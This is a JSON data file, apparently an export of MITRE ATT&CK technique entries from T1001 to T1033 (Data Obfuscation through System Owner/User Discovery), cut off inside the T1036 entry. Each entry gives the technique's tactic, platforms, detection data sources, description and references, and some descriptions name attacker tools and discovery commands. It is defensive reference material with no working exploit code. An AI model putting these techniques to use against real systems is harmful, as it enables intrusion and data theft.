 [
  {
    "id": "attack-pattern--ad255bfe-a9e6-4b52-a258-8d3462abe842",
    "platform": "linux|macos|windows",
    "tid": "T1001",
    "technique": "Data Obfuscation",
    "tactic": "command-and-control",
    "datasources": "network-protocol-analysis|packet-capture|process-monitoring|process-use-of-network",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1001.001",
      "T1001.002",
      "T1001.003"
    ],
    "count_subtechniques": 3,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may obfuscate command and control traffic to make it more difficult to detect. Command and control (C2) communications are hidden (but not necessarily encrypted) in an attempt to make the content more difficult to discover or decipher and to make the communication less conspicuous and hide commands from being seen. This encompasses many methods, such as adding junk data to protocol traffic, using steganography, or impersonating legitimate protocols.</p>\n",
    "technique_references": [
      {
        "source_name": "University of Birmingham C2",
        "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf",
        "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--0a3ead4e-6d47-4ccb-854c-a6a4f9d96b22",
    "platform": "windows|linux|macos",
    "tid": "T1003",
    "technique": "OS Credential Dumping",
    "tactic": "credential-access",
    "datasources": "api-monitoring|powershell-logs|process-command-line-parameters|process-monitoring",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1003.001",
      "T1003.002",
      "T1003.003",
      "T1003.004",
      "T1003.005",
      "T1003.006",
      "T1003.007",
      "T1003.008"
    ],
    "count_subtechniques": 8,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software. Credentials can then be used to perform <a href=\"https://attack.mitre.org/tactics/TA0008\">Lateral Movement</a> and access restricted information.<!-- raw HTML omitted --><!-- raw HTML omitted -->Several of the tools mentioned in associated sub-techniques may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.<!-- raw HTML omitted --></p>\n",
    "technique_references": [
      {
        "source_name": "Medium Detecting Attempts to Steal Passwords from Memory",
        "url": "https://medium.com/threatpunter/detecting-attempts-to-steal-passwords-from-memory-558f16dce4ea",
        "description": "French, D. (2018, October 2). Detecting Attempts to Steal Passwords from Memory. Retrieved October 11, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Powersploit",
        "url": "https://github.com/mattifestation/PowerSploit",
        "description": "PowerSploit. (n.d.). Retrieved December 4, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft DRSR Dec 2017",
        "url": "https://msdn.microsoft.com/library/cc228086.aspx",
        "description": "Microsoft. (2017, December 1). MS-DRSR Directory Replication Service (DRS) Remote Protocol. Retrieved December 4, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft GetNCCChanges",
        "url": "https://msdn.microsoft.com/library/dd207691.aspx",
        "description": "Microsoft. (n.d.). IDL_DRSGetNCChanges (Opnum 3). Retrieved December 4, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Samba DRSUAPI",
        "url": "https://wiki.samba.org/index.php/DRSUAPI",
        "description": "SambaWiki. (n.d.). DRSUAPI. Retrieved December 4, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Harmj0y DCSync Sept 2015",
        "url": "http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/",
        "description": "Schroeder, W. (2015, September 22). Mimikatz and DCSync and ExtraSids, Oh My. Retrieved December 4, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft NRPC Dec 2017",
        "url": "https://msdn.microsoft.com/library/cc237008.aspx",
        "description": "Microsoft. (2017, December 1). MS-NRPC - Netlogon Remote Protocol. Retrieved December 6, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft SAMR",
        "url": "https://msdn.microsoft.com/library/cc245496.aspx",
        "description": "Microsoft. (n.d.). MS-SAMR Security Account Manager (SAM) Remote Protocol (Client-to-Server) - Transport. Retrieved December 4, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "AdSecurity DCSync Sept 2015",
        "url": "https://adsecurity.org/?p=1729",
        "description": "Metcalf, S. (2015, September 25). Mimikatz DCSync Usage, Exploitation, and Detection. Retrieved December 4, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--3c4a2599-71ee-4405-ba1e-0e28414b4bc5",
    "platform": "linux|macos|windows",
    "tid": "T1005",
    "technique": "Data from Local System",
    "tactic": "collection",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may search local system sources, such as file systems or local databases, to find files of interest and sensitive data prior to Exfiltration.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may do this using a <a href=\"https://attack.mitre.org/techniques/T1059\">Command and Scripting Interpreter</a>, such as <a href=\"https://attack.mitre.org/software/S0106\">cmd</a>, which has functionality to interact with the file system to gather information. Some adversaries may also use <a href=\"https://attack.mitre.org/techniques/T1119\">Automated Collection</a> on the local system.<!-- raw HTML omitted --></p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--0c8ab3eb-df48-4b9c-ace7-beacaac81cc5",
    "platform": "windows",
    "tid": "T1006",
    "technique": "Direct Volume Access",
    "tactic": "defense-evasion",
    "datasources": "api-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique bypasses Windows file access controls as well as file system monitoring tools. (Citation: Hakobyan 2009)<!-- raw HTML omitted --><!-- raw HTML omitted -->Utilities, such as NinjaCopy, exist to perform these actions in PowerShell. (Citation: Github PowerSploit Ninjacopy)</p>\n",
    "technique_references": [
      {
        "source_name": "Hakobyan 2009",
        "url": "http://www.codeproject.com/Articles/32169/FDump-Dumping-File-Sectors-Directly-from-Disk-usin",
        "description": "Hakobyan, A. (2009, January 8). FDump - Dumping File Sectors Directly from Disk using Logical Offsets. Retrieved November 12, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "Github PowerSploit Ninjacopy",
        "url": "https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1",
        "description": "Bialek, J. (2015, December 16). Invoke-NinjaCopy.ps1. Retrieved June 2, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--322bad5a-1c49-4d23-ab79-76d641794afa",
    "platform": "windows",
    "tid": "T1007",
    "technique": "System Service Discovery",
    "tactic": "discovery",
    "datasources": "process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may try to get information about registered services. Commands that may obtain information about services using operating system utilities are “sc,” “tasklist /svc” using <a href=\"https://attack.mitre.org/software/S0057\">Tasklist</a>, and “net start” using <a href=\"https://attack.mitre.org/software/S0039\">Net</a>, but adversaries may also use other tools as well. Adversaries may use the information from <a href=\"https://attack.mitre.org/techniques/T1007\">System Service Discovery</a> during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/574.html",
        "description": "none",
        "external_id": "CAPEC-574"
      }
    ]
  },
  {
    "id": "attack-pattern--f24faf46-3b26-4dbb-98f2-63460498e433",
    "platform": "linux|windows|macos",
    "tid": "T1008",
    "technique": "Fallback Channels",
    "tactic": "command-and-control",
    "datasources": "malware-reverse-engineering|netflow-enclave-netflow|packet-capture|process-monitoring|process-use-of-network",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.</p>\n",
    "technique_references": [
      {
        "source_name": "University of Birmingham C2",
        "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf",
        "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--4ae4f953-fe58-4cc8-a327-33257e30a830",
    "platform": "macos|windows",
    "tid": "T1010",
    "technique": "Application Window Discovery",
    "tactic": "discovery",
    "datasources": "api-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used or give context to information collected by a keylogger.</p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--51ea26b1-ff1e-4faa-b1a0-1114cd298c87",
    "platform": "linux|macos|windows",
    "tid": "T1011",
    "technique": "Exfiltration Over Other Network Medium",
    "tactic": "exfiltration",
    "datasources": "process-monitoring|user-interface",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1011.001"
    ],
    "count_subtechniques": 1,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may attempt to exfiltrate data over a different network medium than the command and control channel. If the command and control network is a wired Internet connection, the exfiltration may occur, for example, over a WiFi connection, modem, cellular data connection, Bluetooth, or another radio frequency (RF) channel.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may choose to do this if they have sufficient access or proximity, and the connection might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network</p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--c32f7008-9fea-41f7-8366-5eb9b74bd896",
    "platform": "windows",
    "tid": "T1012",
    "technique": "Query Registry",
    "tactic": "discovery",
    "datasources": "process-command-line-parameters|process-monitoring|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.<!-- raw HTML omitted --><!-- raw HTML omitted -->The Registry contains a significant amount of information about the operating system, configuration, software, and security.(Citation: Wikipedia Windows Registry) Information can easily be queried using the <a href=\"https://attack.mitre.org/software/S0075\">Reg</a> utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from <a href=\"https://attack.mitre.org/techniques/T1012\">Query Registry</a> during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/647.html",
        "description": "none",
        "external_id": "CAPEC-647"
      },
      {
        "source_name": "Wikipedia Windows Registry",
        "url": "https://en.wikipedia.org/wiki/Windows_Registry",
        "description": "Wikipedia. (n.d.). Windows Registry. Retrieved February 2, 2015.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--0f20e3cb-245b-4a61-8a91-2d93f7cb0e9b",
    "platform": "linux|macos|windows",
    "tid": "T1014",
    "technique": "Rootkit",
    "tactic": "defense-evasion",
    "datasources": "bios|mbr|system-calls",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting/hooking and modifying operating system API calls that supply system information. (Citation: Symantec Windows Rootkits) <!-- raw HTML omitted --><!-- raw HTML omitted -->Rootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a hypervisor, Master Boot Record, or <a href=\"https://attack.mitre.org/techniques/T1542/001\">System Firmware</a>. (Citation: Wikipedia Rootkit) Rootkits have been seen for Windows, Linux, and Mac OS X systems. (Citation: CrowdStrike Linux Rootkit) (Citation: BlackHat Mac OSX Rootkit)</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/552.html",
        "description": "none",
        "external_id": "CAPEC-552"
      },
      {
        "source_name": "Symantec Windows Rootkits",
        "url": "https://www.symantec.com/avcenter/reference/windows.rootkit.overview.pdf",
        "description": "Symantec. (n.d.). Windows Rootkit Overview. Retrieved December 21, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Wikipedia Rootkit",
        "url": "https://en.wikipedia.org/wiki/Rootkit",
        "description": "Wikipedia. (2016, June 1). Rootkit. Retrieved June 2, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "CrowdStrike Linux Rootkit",
        "url": "https://www.crowdstrike.com/blog/http-iframe-injecting-linux-rootkit/",
        "description": "Kurtz, G. (2012, November 19). HTTP iframe Injecting Linux Rootkit. Retrieved December 21, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "BlackHat Mac OSX Rootkit",
        "url": "http://www.blackhat.com/docs/asia-14/materials/Tsai/WP-Asia-14-Tsai-You-Cant-See-Me-A-Mac-OS-X-Rootkit-Uses-The-Tricks-You-Havent-Known-Yet.pdf",
        "description": "Pan, M., Tsai, S. (2014). You can’t see me: A Mac OS X Rootkit uses the tricks you haven't known yet. Retrieved December 21, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--707399d6-ab3e-4963-9315-d9d3818cd6a0",
    "platform": "linux|macos|windows",
    "tid": "T1016",
    "technique": "System Network Configuration Discovery",
    "tactic": "discovery",
    "datasources": "process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may look for details about the network configuration and settings of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include <a href=\"https://attack.mitre.org/software/S0099\">Arp</a>, <a href=\"https://attack.mitre.org/software/S0100\">ipconfig</a>/<a href=\"https://attack.mitre.org/software/S0101\">ifconfig</a>, <a href=\"https://attack.mitre.org/software/S0102\">nbtstat</a>, and <a href=\"https://attack.mitre.org/software/S0103\">route</a>.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may use the information from <a href=\"https://attack.mitre.org/techniques/T1016\">System Network Configuration Discovery</a> during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/309.html",
        "description": "none",
        "external_id": "CAPEC-309"
      }
    ]
  },
  {
    "id": "attack-pattern--e358d692-23c0-4a31-9eb6-ecc13a8d7735",
    "platform": "linux|macos|windows",
    "tid": "T1018",
    "technique": "Remote System Discovery",
    "tactic": "discovery",
    "datasources": "network-protocol-analysis|process-command-line-parameters|process-monitoring|process-use-of-network",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  <a href=\"https://attack.mitre.org/software/S0097\">Ping</a> or <!-- raw HTML omitted -->net view<!-- raw HTML omitted --> using <a href=\"https://attack.mitre.org/software/S0039\">Net</a>. Adversaries may also use local host files (ex: <!-- raw HTML omitted -->C:\\Windows\\System32\\Drivers\\etc\\hosts<!-- raw HTML omitted --> or <!-- raw HTML omitted -->/etc/hosts<!-- raw HTML omitted -->) in order to discover the hostname to IP address mappings of remote systems. <!-- raw HTML omitted --><!-- raw HTML omitted -->Specific to macOS, the <!-- raw HTML omitted -->bonjour<!-- raw HTML omitted --> protocol exists to discover additional Mac-based systems within the same broadcast domain.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/292.html",
        "description": "none",
        "external_id": "CAPEC-292"
      }
    ]
  },
  {
    "id": "attack-pattern--774a3188-6ba9-4dc4-879d-d54ee48a5ce9",
    "platform": "linux|macos|windows|network",
    "tid": "T1020",
    "technique": "Automated Exfiltration",
    "tactic": "exfiltration",
    "datasources": "file-monitoring|process-monitoring|process-use-of-network",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1020.001"
    ],
    "count_subtechniques": 1,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection. <!-- raw HTML omitted --><!-- raw HTML omitted -->When automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as <a href=\"https://attack.mitre.org/techniques/T1041\">Exfiltration Over C2 Channel</a> and <a href=\"https://attack.mitre.org/techniques/T1048\">Exfiltration Over Alternative Protocol</a>.</p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--54a649ff-439a-41a4-9856-8d144a2551ba",
    "platform": "linux|macos|windows",
    "tid": "T1021",
    "technique": "Remote Services",
    "tactic": "lateral-movement",
    "datasources": "api-monitoring|authentication-logs|dll-monitoring|file-monitoring|netflow-enclave-netflow|network-protocol-analysis|packet-capture|powershell-logs|process-command-line-parameters|process-monitoring|process-use-of-network|windows-event-logs|windows-registry",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1021.001",
      "T1021.002",
      "T1021.003",
      "T1021.004",
      "T1021.005",
      "T1021.006"
    ],
    "count_subtechniques": 6,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use <a href=\"https://attack.mitre.org/techniques/T1078\">Valid Accounts</a> to log into a service specifically designed to accept remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user.<!-- raw HTML omitted --><!-- raw HTML omitted -->In an enterprise environment, servers and workstations can be organized into domains. Domains provide centralized identity management, allowing users to login using one set of credentials across the entire network. If an adversary is able to obtain a set of valid domain credentials, they could login to many different machines using remote access protocols such as secure shell (SSH) or remote desktop protocol (RDP).(Citation: SSH Secure Shell)(Citation: TechNet Remote Desktop Services)</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/555.html",
        "description": "none",
        "external_id": "CAPEC-555"
      },
      {
        "source_name": "SSH Secure Shell",
        "url": "https://www.ssh.com/ssh",
        "description": "SSH.COM. (n.d.). SSH (Secure Shell). Retrieved March 23, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Remote Desktop Services",
        "url": "https://technet.microsoft.com/en-us/windowsserver/ee236407.aspx",
        "description": "Microsoft. (n.d.). Remote Desktop Services. Retrieved June 1, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--1b7ba276-eedc-4951-a762-0ceea2c030ec",
    "platform": "linux|macos|windows",
    "tid": "T1025",
    "technique": "Data from Removable Media",
    "tactic": "collection",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may search connected removable media on computers they have compromised to find files of interest. Sensitive data can be collected from any removable media (optical disk drive, USB memory, etc.) connected to the compromised system prior to Exfiltration. Interactive command shells may be in use, and common functionality within <a href=\"https://attack.mitre.org/software/S0106\">cmd</a> may be used to gather information. <!-- raw HTML omitted --><!-- raw HTML omitted -->Some adversaries may also use <a href=\"https://attack.mitre.org/techniques/T1119\">Automated Collection</a> on removable media.</p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--b3d682b6-98f2-4fb0-aa3b-b4df007ca70a",
    "platform": "linux|macos|windows",
    "tid": "T1027",
    "technique": "Obfuscated Files or Information",
    "tactic": "defense-evasion",
    "datasources": "binary-file-metadata|email-gateway|environment-variable|file-monitoring|malware-reverse-engineering|network-intrusion-detection-system|network-protocol-analysis|process-command-line-parameters|process-monitoring|process-use-of-network|ssl-tls-inspection|windows-event-logs",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1027.001",
      "T1027.002",
      "T1027.003",
      "T1027.004",
      "T1027.005"
    ],
    "count_subtechniques": 5,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. <!-- raw HTML omitted --><!-- raw HTML omitted -->Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user’s action may be required to open and <a href=\"https://attack.mitre.org/techniques/T1140\">Deobfuscate/Decode Files or Information</a> for <a href=\"https://attack.mitre.org/techniques/T1204\">User Execution</a>. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also used compressed or archived scripts, such as JavaScript. <!-- raw HTML omitted --><!-- raw HTML omitted -->Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may also obfuscate commands executed from payloads or directly via a <a href=\"https://attack.mitre.org/techniques/T1059\">Command and Scripting Interpreter</a>. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017)</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/267.html",
        "description": "none",
        "external_id": "CAPEC-267"
      },
      {
        "source_name": "Volexity PowerDuke November 2016",
        "url": "https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/",
        "description": "Adair, S.. (2016, November 9). PowerDuke: Widespread Post-Election Spear Phishing Campaigns Targeting Think Tanks and NGOs. Retrieved January 11, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Linux/Cdorked.A We Live Security Analysis",
        "url": "https://www.welivesecurity.com/2013/04/26/linuxcdorked-new-apache-backdoor-in-the-wild-serves-blackhole/",
        "description": "Pierre-Marc Bureau. (2013, April 26). Linux/Cdorked.A: New Apache backdoor being used in the wild to serve Blackhole. Retrieved September 10, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Carbon Black Obfuscation Sept 2016",
        "url": "https://www.carbonblack.com/2016/09/23/security-advisory-variants-well-known-adware-families-discovered-include-sophisticated-obfuscation-techniques-previously-associated-nation-state-attacks/",
        "description": "Tedesco, B. (2016, September 23). Security Alert Summary. Retrieved February 12, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye Obfuscation June 2017",
        "url": "https://www.fireeye.com/blog/threat-research/2017/06/obfuscation-in-the-wild.html",
        "description": "Bohannon, D. & Carr N. (2017, June 30). Obfuscation in the Wild: Targeted Attackers Lead the Way in Evasion Techniques. Retrieved February 12, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye Revoke-Obfuscation July 2017",
        "url": "https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/revoke-obfuscation-report.pdf",
        "description": "Bohannon, D. & Holmes, L. (2017, July 27). Revoke-Obfuscation: PowerShell Obfuscation Detection Using Science. Retrieved February 12, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "PaloAlto EncodedCommand March 2017",
        "url": "https://researchcenter.paloaltonetworks.com/2017/03/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/",
        "description": "White, J. (2017, March 10). Pulling Back the Curtains on EncodedCommand PowerShell Attacks. Retrieved February 12, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "GitHub Revoke-Obfuscation",
        "url": "https://github.com/danielbohannon/Revoke-Obfuscation",
        "description": "Bohannon, D. (2017, July 27). Revoke-Obfuscation. Retrieved February 12, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "GitHub Office-Crackros Aug 2016",
        "url": "https://github.com/itsreallynick/office-crackros",
        "description": "Carr, N. (2016, August 14). OfficeCrackros. Retrieved February 12, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--4eeaf8a9-c86b-4954-a663-9555fb406466",
    "platform": "linux|macos|windows",
    "tid": "T1029",
    "technique": "Scheduled Transfer",
    "tactic": "exfiltration",
    "datasources": "netflow-enclave-netflow|process-monitoring|process-use-of-network",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may schedule data exfiltration to be performed only at certain times of day or at certain intervals. This could be done to blend traffic patterns with normal activity or availability.<!-- raw HTML omitted --><!-- raw HTML omitted -->When scheduled exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as <a href=\"https://attack.mitre.org/techniques/T1041\">Exfiltration Over C2 Channel</a> or <a href=\"https://attack.mitre.org/techniques/T1048\">Exfiltration Over Alternative Protocol</a>.</p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--c3888c54-775d-4b2f-b759-75a2ececcbfd",
    "platform": "linux|macos|windows",
    "tid": "T1030",
    "technique": "Data Transfer Size Limits",
    "tactic": "exfiltration",
    "datasources": "netflow-enclave-netflow|packet-capture|process-monitoring|process-use-of-network",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>An adversary may exfiltrate data in fixed size chunks instead of whole files or limit packet sizes below certain thresholds. This approach may be used to avoid triggering network data transfer threshold alerts.</p>\n",
    "technique_references": [
      {
        "source_name": "University of Birmingham C2",
        "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf",
        "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--03d7999c-1f4c-42cc-8373-e7690d318104",
    "platform": "linux|macos|windows",
    "tid": "T1033",
    "technique": "System Owner/User Discovery",
    "tactic": "discovery",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using <a href=\"https://attack.mitre.org/techniques/T1003\">OS Credential Dumping</a>. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from <a href=\"https://attack.mitre.org/techniques/T1033\">System Owner/User Discovery</a> during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.<!-- raw HTML omitted --><!-- raw HTML omitted -->Utilities and commands that acquire this information include <!-- raw HTML omitted -->whoami<!-- raw HTML omitted -->. In Mac and Linux, the currently logged in user can be identified with <!-- raw HTML omitted -->w<!-- raw HTML omitted --> and <!-- raw HTML omitted -->who<!-- raw HTML omitted -->.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/577.html",
        "description": "none",
        "external_id": "CAPEC-577"
      }
    ]
  },
  {
    "id": "attack-pattern--42e8de7b-37b2-4258-905a-6897815e58e0",
    "platform": "linux|macos|windows",
    "tid": "T1036",
    "technique": "Masquerading",
